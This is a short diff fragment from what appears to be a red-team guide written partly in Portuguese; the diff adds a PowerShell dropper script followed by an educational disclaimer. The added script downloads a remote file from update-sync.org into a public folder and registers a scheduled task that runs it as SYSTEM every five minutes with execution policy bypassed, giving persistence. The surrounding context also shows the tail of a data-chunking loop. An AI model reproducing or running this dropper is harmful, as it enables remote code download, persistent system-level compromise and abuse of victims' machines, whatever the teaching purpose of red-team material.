@@ -463,6 +463,14 @@ foreach ($chunk in $chunks) {
 }
 del .\info.txt
 ```
+dropper.ps1
+```
+$url = "http://update-sync.org/update.ps1"
+$out = "C:\Users\public\update.ps1"
+$wc = New-Object Net.WebClient
+$wc.DownloadFile($url, $out)
+cmd /c 'schtasks /create /tn "Update-sync" /tr "powershell -ep bypass -f c:\users\public\update.ps1" /sc minute /mo 5 /ru "System"'
+```
 
 # Aviso de Isenção de Responsabilidade – Material de Red Team
 Este material destina-se exclusivamente a fins educacionais, acadêmicos e de conscientização em segurança da informação. As técnicas, exemplos e cenários aqui descritos têm como objetivo demonstrar vulnerabilidades potenciais e auxiliar profissionais de segurança na prevenção, detecção e resposta a ameaças.
